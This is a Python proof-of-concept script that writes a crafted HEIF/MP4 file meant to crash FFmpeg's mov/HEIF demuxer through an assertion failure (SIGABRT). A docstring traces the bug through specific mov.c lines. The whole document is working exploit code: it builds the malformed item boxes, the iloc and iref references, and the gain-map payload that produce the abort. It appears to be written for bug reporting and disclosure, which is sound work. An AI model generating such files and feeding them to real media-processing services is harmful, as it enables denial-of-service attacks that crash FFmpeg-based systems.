#!/usr/bin/env python3
"""PoC: FFmpeg mov/HEIF demuxer assertion (CWE-617) -> SIGABRT.

Chain:
  * one HEIF item (id 1) appears in TWO 'infe' boxes: first as 'av01' (which
    creates an AVStream and sets item->st, mov.c:9662-9669), then as 'tmap'
    (which only overwrites item->type, mov.c:9658-9660, leaving item->st set).
  * 'iloc' gives it an extent holding a valid ISO 21496-1 gain map payload.
  * iref/dimg of item 1 (tmap, 2 entries) creates group G1;
    mov_parse_heif_layered_video_tmap() parses it successfully and therefore
    sets item1->stg (mov.c:11778) - the item now owns BOTH a stream and a
    stream group.
  * iref/dimg of item 4 (tmap) creates group G2 referencing item 1;
    the invariant av_assert0(!st != !child_stg) at mov.c:11644 evaluates to
    false (both are set) and aborts the process.
"""
import struct

def box(t, payload):
    return struct.pack('>I', 8 + len(payload)) + t + payload

def fullbox(t, version, flags, payload):
    return box(t, bytes([version]) + struct.pack('>I', flags)[1:] + payload)

def infe(item_id, typ, name, flags=0):
    return fullbox(b'infe', 2, flags,
                   struct.pack('>HH', item_id, 0) + typ + name + b'\0')

def iloc_entry(item_id, off, ln):
    # version 0, offset_size=4, length_size=4, base_offset_size=0
    return struct.pack('>HH', item_id, 0) + struct.pack('>H', 1) + \
           struct.pack('>II', off, ln)

def iref_dimg(from_id, ids):
    payload = struct.pack('>HH', from_id, len(ids)) + \
              b''.join(struct.pack('>H', i) for i in ids)
    return struct.pack('>I', 8 + len(payload)) + b'dimg' + payload

def q(num, den):
    return struct.pack('>Ii', num, den)

# ---- valid ISO 21496-1 gain map payload (61 bytes, 1 channel) ----
gain = (struct.pack('>HH', 0, 0) + b'\x00' +
        q(1, 1) + q(1, 1) +
        q(0, 1) + q(1, 1) + q(1, 1) + q(1, 64) + q(1, 64))
assert len(gain) == 61, len(gain)
tmap_extent = b'\x00' + gain                      # version byte + payload
tile = b'\x00' * 8

ftyp = box(b'ftyp', b'mif1' + struct.pack('>I', 0) + b'mif1' + b'heic')

mdat_body = tmap_extent + tile + tile + tile
mdat = box(b'mdat', mdat_body)
base = len(ftyp) + 8
off1 = base
off2 = off1 + len(tmap_extent)
off3 = off2 + len(tile)
off4 = off3 + len(tile)

hdlr = fullbox(b'hdlr', 0, 0, b'pict' + b'\0' * 16)
pitm = fullbox(b'pitm', 0, 0, struct.pack('>H', 1))
iloc = fullbox(b'iloc', 0, 0, bytes([0x44, 0x00]) + struct.pack('>H', 4) +
               iloc_entry(1, off1, len(tmap_extent)) +
               iloc_entry(2, off2, len(tile)) +
               iloc_entry(3, off3, len(tile)) +
               iloc_entry(4, off4, len(tile)))
iinf = fullbox(b'iinf', 0, 0, struct.pack('>H', 5) +
               infe(1, b'av01', b'a') +      # creates stream + item1->st
               infe(2, b'av01', b'b') +
               infe(3, b'av01', b'c') +
               infe(4, b'tmap', b'd') +      # G2 owner, no stream
               infe(1, b'tmap', b'e'))       # item1 type now tmap, st kept
iref = fullbox(b'iref', 0, 0,
               iref_dimg(1, [2, 3]) +        # G1: item1 -> two streams
               iref_dimg(4, [1, 2]))         # G2: item4 -> item1 (abort)

meta = fullbox(b'meta', 0, 0, hdlr + pitm + iloc + iinf + iref)
out = ftyp + mdat + meta
import sys; open(sys.argv[1] if len(sys.argv)>1 else 'crash_tmap2.mp4','wb').write(out)
print('wrote %d bytes' % len(out))
